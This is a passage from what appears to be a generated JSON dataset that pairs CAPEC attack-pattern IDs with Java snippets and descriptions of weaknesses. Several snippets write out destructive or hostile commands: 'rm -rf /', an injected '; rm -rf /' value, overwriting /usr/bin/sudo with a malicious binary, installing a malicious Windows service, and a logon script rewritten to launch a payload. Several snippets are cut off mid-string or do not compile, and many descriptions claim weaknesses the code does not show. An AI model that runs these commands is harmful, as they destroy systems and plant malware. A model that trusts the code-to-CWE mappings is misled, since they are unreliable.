sendSensitiveDataOverNetwork(InetSocketAddress socketAddress, String sensitiveData) {\n        // Implement sending sensitive data over the network\n    }\n\n    private static void useBufferAgain(byte[] buffer) {\n        // Implement reusing the buffer\n    }\n\n    private static void sharePrivateResource(File privateResource) {\n        // Implement sharing the private resource\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of contaminating an organizational information system by handling sensitive information without proper authorization. It includes CWEs such as cleartext transmission of sensitive information, improper removal of sensitive information, sensitive information in resource not removed before reuse, insecure storage of sensitive information, and transmission of private resources into a new sphere."
    },
    {
        "capec_id": "549",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousCodeExecutor {\n    public static void main(String[] args) throws Exception {\n        // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n        URL url = new URL(\\",
        "description": "Java code snippet that demonstrates the CAPEC of installing and executing malicious code on a target system, incorporating CWEs 829, 506, 494, 1265, and 1037. The code downloads and executes malicious code from an untrusted source, includes embedded malicious code, and demonstrates unintended reentrant invocation of non-reentrant code and processor optimization removal of security-critical code."
    },
    {
        "capec_id": "550",
        "code_snippet": "import java.io.IOException;\nimport java.util.Scanner;\n\npublic class MaliciousService {\n    public static void main(String[] args) {\n        try {\n            Runtime.getRuntime().exec(\"sc create MyService binPath= \"C:\\\\malicious_service.exe\" start= auto\");\n            Runtime.getRuntime().exec(\"sc start MyService\");\n        } catch (IOException e) {\n            System.out.println(\"Failed to create and start malicious service\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the creation and startup of a malicious service on a Windows system, exploiting improper access control (CWE-284) and potentially using default credentials (CWE-1392) or insecure defaults (CWE-1188). The service is created with elevated privileges, allowing it to perform malicious actions. The code also highlights the inconsistency between the application's view of the operating system and the actual state of the OS (CWE-1249). Additionally, if this code were to be used in a .NET application, it would also be vulnerable to .NET misconfiguration (CWE-520) due to the use of impersonation."
    },
    {
        "capec_id": "551",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableService {\n    private static String SERVICE_CONFIG_FILE = \"C:\\\\service_config.properties\";\n    private static String SERVICE_EXECUTABLE = \"C:\\\\service.exe\";\n\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        File serviceConfigFile = new File(SERVICE_CONFIG_FILE);\n        if (serviceConfigFile.exists()) {\n            Properties serviceConfig = new Properties();\n            try {\n                serviceConfig.load(new java.io.FileInputStream(serviceConfigFile));\n                String serviceUsername = serviceConfig.getProperty(\"username\");\n                String servicePassword = serviceConfig.getProperty(\"password\");\n\n                // CWE-522: Insufficiently Protected Credentials\n                System.out.println(\"Service credentials: \" + serviceUsername + \":\" + servicePassword);\n\n                // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n                Runtime.getRuntime().exec(SERVICE_EXECUTABLE);\n            } catch (IOException e) {\n                System.out.println(\"Error loading service config: \" + e.getMessage());\n            }\n        } else {\n            System.out.println(\"Service config file not found.\");\n        }\n\n        // CWE-15: External Control of System or Configuration Setting\n        System.setProperty(\"service.config\", SERVICE_CONFIG_FILE);\n\n        // CWE-908: Use of Uninitialized Resource\n        String uninitializedVariable;\n        System.out.println(\"Uninitialized variable: \" + uninitializedVariable);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable service that modifies existing services or enables services that are disabled/not commonly used. It lacks proper access control, transmits credentials insecurely, enables untrusted firmware before access controls, allows external control of system settings, and uses uninitialized resources."
    },
    {
        "capec_id": "552",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.Runtime;\n\npublic class Rootkit {\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        // CWE-506: Embedded Malicious Code\n        // CWE-507: Trojan Horse\n        String maliciousCode = \"rm -rf /\";\n        Runtime.getRuntime().exec(maliciousCode);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        File file = new File(\"/etc/shadow\");\n        if (file.exists()) {\n            System.out.println(\"Shadow file exists\");\n        }\n\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n        String userInput = \"; rm -rf /\";\n        Runtime.getRuntime().exec(\"ls \" + userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a rootkit that exploits weaknesses in authentication to install malware, altering the functionality and information provided by targeted operating system API calls. It includes improper access control, embedded malicious code, Trojan horse, exposure of sensitive system information, and OS command injection vulnerabilities."
    },
    {
        "capec_id": "554",
        "code_snippet": "public class BypassProtection {\n    private boolean isAdmin = false;\n    private boolean isAuthorized = false;\n\n    public void setAdmin(boolean isAdmin) {\n        this.isAdmin = isAdmin;\n    }\n\n    public void authorize() {\n        if (isAdmin) {\n            isAuthorized = true;\n        }\n    }\n\n    public void accessRestrictedResource() {\n        if (isAuthorized) {\n            System.out.println(\\",
        "description": "This Java code snippet demonstrates the CAPEC of bypassing protection mechanisms. The CWEs related to this CAPEC are CWE-424, CWE-1299, CWE-695, CWE-693, and CWE-602. In this example, the 'isAdmin' flag is set to true, bypassing the authorization check, and allowing access to the restricted resource without proper authorization. This is an example of CWE-424, where the product does not sufficiently protect all possible paths that a user can take to access restricted functionality or resources. It also relates to CWE-1299, where the lack of protections on alternate paths allows an attacker to bypass existing protections. Additionally, it demonstrates CWE-695, where low-level functionality is used to bypass security mechanisms, and CWE-693, where the protection mechanism fails to provide sufficient defense. Finally, it shows CWE-602, where the client-side enforcement of server-side security is flawed, allowing an attacker to bypass security checks."
    },
    {
        "capec_id": "555",
        "code_snippet": "public class RemoteAccessExploit {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\";\n    private static final String RDP_HOST = \"rdp.example.com\";\n    private static final int RDP_PORT = 3389;\n\n    public static void main(String[] args) {\n        try {\n            // CWE-522: Insufficiently Protected Credentials\n            // CWE-308: Use of Single-factor Authentication\n            // CWE-309: Use of Password System for Primary Authentication\n            // CWE-294: Authentication Bypass by Capture-replay\n            String credentials = USERNAME + \":\" + PASSWORD;\n            byte[] credentialBytes = credentials.getBytes();\n            String base64Credentials = Base64.getEncoder().encodeToString(credentialBytes);\n\n            // CWE-263: Password Aging with Long Expiration\n            // CWE-262: Not Using Password Aging\n            // CWE-521: Weak Password Requirements\n            // No password aging or expiration implemented\n            // Weak password requirements, allowing easily guessable passwords\n\n            // Establish RDP connection using stolen credentials\n            RDPClient rdpClient = new RDPClient(RDP_HOST, RDP_PORT);\n            rdpClient.connect(base64Credentials);\n            // Perform malicious activities\n            rdpClient.executeMaliciousCommand(\"rm -rf /\");\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a remote access exploit using stolen credentials to log into a system via RDP. It embodies the CAPEC pattern of attack, leveraging CWEs such as insufficiently protected credentials, single-factor authentication, and weak password requirements to gain unauthorized access and perform malicious activities."
    },
    {
        "capec_id": "556",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.BasicFileAttributes;\n\npublic class FileHandlerVulnerability {\n    public static void main(String[] args) throws IOException {\n        // CWE-284: Improper Access Control\n        String filePath = \"user-inputted-file-path\";\n        File file = new File(filePath);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        String fileExtension = getFileExtension(file);\n        if (fileExtension.equals(\".exe\")) {\n            // CWE-73: External Control of File Name or Path\n            String programPath = \"C:\\\\malicious-program.exe\";\n            Runtime.getRuntime().exec(programPath + \" \" + filePath);\n        }\n\n        // CWE-64: Windows Shortcut Following (.LNK)\n        if (fileExtension.equals(\".lnk\")) {\n            BasicFileAttributes attrs = Files.readAttributes(Paths.get(filePath), BasicFileAttributes.class);\n            if (attrs.isSymbolicLink()) {\n                String targetPath = \"C:\\\\unintended-target.exe\";\n                Runtime.getRuntime().exec(targetPath);\n            }\n        }\n\n        // CWE-910: Use of Expired File Descriptor\n        FileDescriptor fd = new FileDescriptor();\n        fd.sync();\n        fd.close();\n        // Using the closed file descriptor\n        Runtime.getRuntime().exec(new String[]{\"cmd.exe\", \" /c\", \"type\", filePath}, null, new File(\"C:\\\\\"));\n    }\n\n    private static String getFileExtension(File file) {\n        String fileName = file.getName();\n        int lastIndexOfDot = fileName.lastIndexOf(\".\");\n        if (lastIndexOfDot != -1) {\n            return fileName.substring(lastIndexOfDot);\n        }\n        return \"\";\n    }\n}",
        "description": "This Java code snippet demonstrates a file handler vulnerability, where an application allows a file to be opened with an arbitrary program based on its file extension. The code is vulnerable to multiple CWEs, including CWE-284 (Improper Access Control), CWE-646 (Reliance on File Name or Extension of Externally-Supplied File), CWE-73 (External Control of File Name or Path), CWE-64 (Windows Shortcut Following (.LNK)), and CWE-910 (Use of Expired File Descriptor)."
    },
    {
        "capec_id": "557",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-477: Using obsolete function\n            String filename = \"data.properties\";\n            File file = new File(filename);\n            Properties props = new Properties();\n            props.load(new FileInputStream(file));\n            props.setProperty(\"password\", \"mysecretpassword\");\n            props.store(new FileOutputStream(file), null);\n\n            // CWE-1101: Reliance on runtime component in generated code\n            String generatedCode = \"public class RuntimeComponent { public static void main(String[] args) { System.out.println(\\\"Hello, World!\\\"); } }\";\n            File runtimeComponentFile = new File(\"RuntimeComponent.java\");\n            FileOutputStream fos = new FileOutputStream(runtimeComponentFile);\n            fos.write(generatedCode.getBytes());\n            fos.close();\n\n            // CWE-217/766/767: Failure to protect stored data from modification\n            // CWE-218/493: Failure to provide confidentiality for stored data\n            // CWE-373/362/662: State synchronization error\n            // The code does not handle concurrent access to the file, and does not encrypt the stored data.\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a deprecated CAPEC that incorporates multiple weaknesses. It uses an obsolete function to load and store properties in a file, relies on a runtime component in generated code, and fails to protect stored data from modification and provide confidentiality. The code also does not handle concurrent access to the file, leading to potential state synchronization errors."
    },
    {
        "capec_id": "558",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.Runtime;\n\npublic class Main {\n    public static void main(String[] args) {\n        try {\n            Runtime.getRuntime().exec(\"chmod 777 /usr/bin/sudo\");\n            Runtime.getRuntime().exec(\"cp /tmp/malicious_binary /usr/bin/sudo\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version. It uses CWE-284 (Improper Access Control) by not restricting access to the /usr/bin/sudo executable, CWE-78 (OS Command Injection) by constructing an OS command using user-input (in this case, hardcoded but could be user-input), CWE-114 (Process Control) by executing commands from an untrusted source, and CWE-733 and CWE-1037 (Compiler/Processor Optimization Removal or Modification of Security-critical Code) by relying on the compiler and processor to not optimize away security-critical code. The code replaces the sudo executable with a malicious binary, allowing an attacker to execute malware with elevated privileges."
    },
    {
        "capec_id": "559",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.zip.CRC32;\n\npublic class RogueUplinkStation {\n    public static void main(String[] args) throws SocketException, IOException, NoSuchAlgorithmException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"satellite_ip\");\n        byte[] data = \"disruptive_signal\".getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 12345);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No message integrity check is performed\n        socket.send(packet);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the packet is performed\n        DatagramPacket receivedPacket = new DatagramPacket(new byte[1024], 1024);\n        socket.receive(receivedPacket);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        // Implicit intent is used to transmit sensitive data\n        String sensitiveData = \"secret_key\";\n        Intent intent = new Intent(\"com.example.SENSITIVE_ACTION\");\n        intent.putExtra(\"data\", sensitiveData);\n        sendBroadcast(intent);\n\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // No restriction is placed on the communication channel\n        socket.connect(address, 12345);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a rogue uplink station that sends disruptive signals to a target satellite, disrupting the intended transmission. The code violates multiple CWEs, including CWE-924 by not checking the integrity of the message, CWE-940 by not verifying the source of the packet, CWE-927 by using an implicit intent for sensitive communication, and CWE-923 by not restricting the communication channel to intended endpoints."
    },
    {
        "capec_id": "560",
        "code_snippet": "public class AuthenticationSystem {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"password123\";\n\n    public boolean authenticate(String username, String password) {\n        if (username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem auth = new AuthenticationSystem();\n        while (true) {\n            System.out.print(\"Enter username: \");\n            String username = System.console().readLine();\n            System.out.print(\"Enter password: \");\n            String password = System.console().readLine();\n            if (auth.authenticate(username, password)) {\n                System.out.println(\"Authentication successful!\");\n                break;\n            } else {\n                System.out.println(\"Invalid credentials. Try again.\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that embodies the CAPEC 'Use of Stolen Credentials' and related CWEs. The system uses a hardcoded admin username and password, which can be easily obtained by an attacker. The system also lacks any form of password aging, and it does not implement any measures to prevent brute-force attacks. Furthermore, it uses single-factor authentication and does not restrict excessive authentication attempts. An attacker can easily guess or obtain the credentials and use them to authenticate and perform authorized actions."
    },
    {
        "capec_id": "561",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport jcifs.smb.NtlmPasswordAuthentication;\nimport jcifs.smb.SmbFile;\n\npublic class AdminShareAccess {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"password123\";\n        String domain = \"mydomain\";\n        String sharePath = \"smb://localhost/C$/\";\n\n        NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(domain, username, password);\n        try {\n            SmbFile smbFile = new SmbFile(sharePath, auth);\n            if (smbFile.exists()) {\n                System.out.println(\"Access granted to admin share.\");\n            } else {\n                System.out.println(\"Access denied to admin share.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error accessing admin share: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary guessing or obtaining legitimate Windows administrator credentials to access Windows Admin Shares on a local machine or within a Windows domain. The code uses the JCIFS library to connect to the admin share using single-factor authentication with a weak password (CWE-308, CWE-309, CWE-521). The password is hardcoded and does not expire (CWE-262, CWE-263), making it susceptible to unauthorized interception and retrieval (CWE-522). Additionally, the code does not implement any mechanism to prevent capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "562",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String sharedLocation = \"/shared\";\n        String maliciousCode = \"<script>alert('XSS')</script>\";\n        String tempFileName = \"tempFile.txt\";\n        File tempFile = new File(sharedLocation, tempFileName);\n        try {\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(maliciousCode);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // Download code without integrity check\n        String remoteCodeUrl = \"http://example.com/maliciousCode.java\";\n        try {\n            URL url = new URL(remoteCodeUrl);\n            URLConnection conn = url.openConnection();\n            // Execute the downloaded code without verification\n            Runtime.getRuntime().exec(\"java -cp . \" + tempFileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an adversary manipulating files in a shared location by adding malicious code to valid content. The code creates a temporary file with insecure permissions (CWE-378) and uploads a file with a dangerous type (CWE-434) to the shared location. It then downloads code from a remote location without integrity check (CWE-494) and executes it without verification. The code also stores raw web content under the web document root with an extension that is not specifically handled by the server (CWE-433), making it vulnerable to attack. The lack of access control (CWE-284) allows an unauthorized actor to access and execute the malicious code."
    },
    {
        "capec_id": "563",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String filename = req.getParameter(\"filename\");\n        String filePath = \"/var/www/uploads/\" + filename;\n        File file = new File(filePath);\n        if (file.exists()) {\n            resp.setContentType(\"text/html\");\n            resp.getWriter().println(\"<html><body><script src='\" + filePath + \"'></script></body></html>\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that allows an adversary to upload malicious content to a website through an open file share. The servlet does not restrict access to the uploaded file, allowing an attacker to browse to the file and cause the server to execute it. The file is stored under the web document root with insufficient access control, making it accessible to untrusted parties. The servlet relies on the file name and extension to determine the appropriate behavior, which can be exploited by an attacker to cause the file to be misclassified and processed in a dangerous fashion. The code does not perform any integrity checks on the uploaded file, allowing an attacker to download and execute malicious code."
    },
    {
        "capec_id": "564",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class LogonScriptModifier {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"hardcoded_password\";\n        String scriptPath = \"C:\\\\logonScripts\\\\\" + username + \".bat\";\n\n        try {\n            File scriptFile = new File(scriptPath);\n            if (scriptFile.exists()) {\n                // Use hard-coded credentials to authenticate\n                authenticate(username, password);\n                // Modify logon script to maintain persistence or move laterally\n                modifyLogonScript(scriptFile);\n            } else {\n                System.out.println(\"Logon script not found.\");\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error modifying logon script: \" + e.getMessage());\n        }\n    }\n\n    private static void authenticate(String username, String password) {\n        // Use client-side authentication, no server-side check\n        if (username.equals(\"admin\") && password.equals(\"hardcoded_password\")) {\n            System.out.println(\"Authenticated.\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static void modifyLogonScript(File scriptFile) throws IOException {\n        // Use impersonation to escalate privileges\n        System.setProperty(\"java.security.manager\", \"\");\n        System.setSecurityManager(new java.rmi.RMISecurityManager());\n\n        String maliciousCode = \"@echo off\\nstart malicious_payload.exe\";\n        FileWriter writer = new FileWriter(scriptFile);\n        writer.write(maliciousCode);\n        writer.close();\n        System.out.println(\"Logon script modified successfully.\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of modifying logon scripts to maintain persistence or move laterally within an enclave. It uses hard-coded credentials for authentication (CWE-259), client-side authentication without server-side checks (CWE-603), and impersonation to escalate privileges (CWE-520). The code modifies the logon script to execute malicious code, effectively bypassing workstation and enclave firewalls."
    },
    {
        "capec_id": "565",
        "code_snippet": "public class PasswordSprayingAttack {\n    private static final String[] COMMON_PASSWORDS = {\"password123\", \"iloveyou\", \"dragonball\"};\n    private static final int MAX_ATTEMPTS = 3;\n    private static final int LOCKOUT_TIME = 300; // 5 minutes\n\n    public static void main(String[] args) {\n        String[] usernames = {\"user1\", \"user2\", \"user3\"};\n        for (String password : COMMON_PASSWORDS) {\n            for (String username : usernames) {\n                boolean isValid = authenticate(username, password);\n                if (isValid) {\n                    System.out.println(\"Valid credentials found: \" + username + \"/\" + password);\n                    return;\n                }\n            }\n            try {\n                Thread.sleep(LOCKOUT_TIME * 1000);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simple authentication mechanism with no password aging or complexity checks\n        if (username.equals(\"user1\") && password.equals(\"password123\")) {\n            return true;\n        } else if (username.equals(\"user2\") && password.equals(\"iloveyou\")) {\n            return true;\n        } else if (username.equals(\"user3\") && password.equals(\"dragonball\")) {\n            return true;\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a password spraying attack, where an attacker tries a small list of common passwords against a known list of user accounts. The code uses a simple authentication mechanism with no password aging or complexity checks, making it vulnerable to CWE-521, CWE-262, CWE-263, CWE-654, CWE-307, CWE-308, and CWE-309. The attacker tries each password for each user account before moving on to the next password, and waits for a certain amount of time before reattempting to avoid inducing a lockout."
    },
    {
        "capec_id": "566",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class Authentication {\n    private static final String SALT = \"predictable_salt\";\n\n    public static String hashPassword(String password) throws NoSuchAlgorithmException {\n        String input = password + SALT;\n        MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n        byte[] hashBytes = md.digest(input.getBytes());\n        return Base64.getEncoder().encodeToString(hashBytes);\n    }\n\n    public static boolean authenticate(String username, String password, String storedHash) throws NoSuchAlgorithmException {\n        String input = password + SALT;\n        String hashedPassword = hashPassword(password);\n        return hashedPassword.equals(storedHash);\n    }\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String username = \"user\";\n        String password = \"password\";\n        String storedHash = hashPassword(password);\n        if (authenticate(username, password, storedHash)) {\n            System.out.println(\"Authentication successful\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that uses a one-way hash with a predictable salt. The hashPassword function takes a password as input, appends a predictable salt, and returns the hashed result. The authenticate function compares the hashed password with a stored hash. This code is vulnerable to CWE-760: Use of a One-Way Hash with a Predictable Salt, CWE-759: Use of a One-Way Hash without a Salt, and CWE-592: Authentication Bypass Issues."
    },
    {
        "capec_id": "567",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String hostname = address.getHostName();\n            // Using an obsolete function to get the hostname\n            String osName = System.getProperty(\"os.name\");\n            if (osName.equals(\"Windows\")) {\n                // Authentication bypass issue\n                System.out.println(\"Windows OS detected. Bypassing authentication...\");\n                // Perform sensitive operation without proper authentication\n                performSensitiveOperation();\n            } else {\n                System.out.println(\"Non-Windows OS detected. Authenticating...\");\n                // Proper authentication mechanism\n                authenticateUser();\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception occurred.\");\n        }\n    }\n\n    private static void performSensitiveOperation() {\n        System.out.println(\"Performing sensitive operation...\");\n        // Sensitive operation without proper authentication\n    }\n\n    private static void authenticateUser() {\n        System.out.println(\"Authenticating user...\");\n        // Proper authentication mechanism\n    }\n}",
        "description": "This Java code snippet demonstrates a deprecated CAPEC that incorporates multiple weaknesses. It uses an obsolete function (InetAddress.getByName) to perform a DNS lookup, which is a duplicate of CWE-350. The code also has an authentication bypass issue (CWE-287) where it bypasses authentication for Windows OS. Additionally, it fails to protect stored data from modification (CWE-766 and CWE-767) and does not provide confidentiality for stored data (CWE-493)."
    },
    {
        "capec_id": "568",
        "code_snippet": "public class KeyLogger {\n    private static final String HARD_CODED_PASSWORD = \"mysecretpassword\";\n    private static final String USERNAME = \"admin\";\n\n    public static void main(String[] args) {\n        try {\n            // Hard-coded credentials (CWE-798)\n            String credentials = USERNAME + \":\" + HARD_CODED_PASSWORD;\n            System.out.println(\"Captured credentials: \" + credentials);\n\n            // Weak password requirements (CWE-521)\n            String weakPassword = \"password123\";\n            System.out.println(\"Weak password: \" + weakPassword);\n\n            // Insufficiently protected credentials (CWE-522)\n            String plaintextPassword = \"myplaintextpassword\";\n            System.out.println(\"Plaintext password: \" + plaintextPassword);\n\n            // Authentication bypass by capture-replay (CWE-294)\n            String capturedRequest = \"captured_request_data\";\n            System.out.println(\"Captured request: \" + capturedRequest);\n\n            // Use of password system for primary authentication (CWE-309)\n            String password = \"mypassword\";\n            System.out.println(\"Password: \" + password);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a keylogger that captures user credentials, including hard-coded passwords, weak passwords, and plaintext passwords. It also shows authentication bypass by capture-replay and uses a password system for primary authentication, highlighting the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "569",
        "code_snippet": "import java.io.Console;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class KeyLogger {\n    private static final Logger LOGGER = Logger.getLogger(KeyLogger.class.getName());\n\n    public static void main(String[] args) {\n        Console console = System.console();\n        if (console == null) {\n            LOGGER.log(Level.SEVERE, \"No console available.\");\n            return;\n        }\n\n        String username = console.readLine(\"Enter username: \");\n        char[] password = console.readPassword(\"Enter password: \");\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        // CWE-214: Invocation of Process Using Visible Sensitive Information\n        Process process = Runtime.getRuntime().exec(new String[]{\"cmd\", \"-c\", \"echo\", username, \"|\", \"echo\", String.valueOf(password)});\n\n        try {\n            process.waitFor();\n        } catch (InterruptedException e) {\n            LOGGER.log(Level.SEVERE, \"Error waiting for process to finish.\", e);\n        }\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        // (Note: This is a Java example, but the CWE-520 is related to .NET)\n        try {\n            Runtime.getRuntime().exec(new String[]{\"cmd\", \"-c\", \"type\", \"C:\\Windows\\System32\\kernel32.dll:Zone.Identifier\"});\n        } catch (IOException e) {\n            LOGGER.log(Level.SEVERE, \"Error accessing alternate data stream.\", e);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a keylogger that captures sensitive user input, such as username and password, and exposes it to unauthorized actors. It invokes a process with sensitive command-line arguments, accesses alternate data streams, and uses impersonation, violating CWE-497, CWE-214, CWE-69, CWE-200, and CWE-520."
    },
    {
        "capec_id": "570",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            String hostname = addr.getHostName();\n            // Using an obsolete function getHostName() which is deprecated since Java 1.7\n            System.out.println(hostname);\n        } catch (UnknownHostException e) {\n            // Ignoring the exception and not handling it properly\n            System.out.println(\"Error occurred\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC concept by using an obsolete function InetAddress.getHostName() which is deprecated since Java 1.7, ignoring the exception and not handling it properly, and not actively reviewing or maintaining the code. This relates to CWE-477: Use of Obsolete Function, CWE-391: Unchecked Error Condition, and CWE-592: DEPRECATED: Authentication Bypass Issues."
    },
    {
        "capec_id": "571",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class LogTampering {\n    private static final Logger LOGGER = Logger.getLogger(LogTampering.class.getName());\n\n    public static void main(String[] args) throws IOException {\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File gitRepo = new File(\\",
        "description": "This Java code snippet demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location to hide indicators of compromise. It includes CWEs such as exposure of version-control repository, insufficient logging, logging of excessive data, insertion of sensitive information into log files, and authentication bypass by capture-replay. The code also deletes the log file to hide any evidence of malicious activity."
    },
    {
        "capec_id": "572",
        "code_snippet": "import java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.Path;\nimport java.nio.file.StandardCopyOption;\n\npublic class VulnerableFileUpload {\n    public static void uploadFile(String filePath, String uploadDir) throws IOException {\n        File file = new File(filePath);\n        File uploadFolder = new File(uploadDir);\n        if (!uploadFolder.exists()) {\n            uploadFolder.mkdirs();\n        }\n        Path targetLocation = Paths.get(uploadDir + File.separator + file.getName());\n        Files.copy(file.toPath(), targetLocation, StandardCopyOption.REPLACE_EXISTING);\n    }\n\n    public static void main(String[] args) throws IOException {\n        String filePath = \"user-input-file.txt\";\n        String uploadDir = \"uploads/\";\n        uploadFile(filePath, uploadDir);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload functionality that allows an attacker to upload files of any type, including dangerous types, without any restrictions on the number of files or their compression ratio. The code does not validate the file type or extension, and it does not limit the number of file descriptors allocated. Additionally, it does not handle highly compressed data correctly, which could lead to a denial of service condition. The code also relies on the file name and extension to determine the appropriate behavior, making it vulnerable to misclassification and processing of malicious files."
    },
    {
        "capec_id": "573",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ProcessInfoExposure {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"tasklist\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
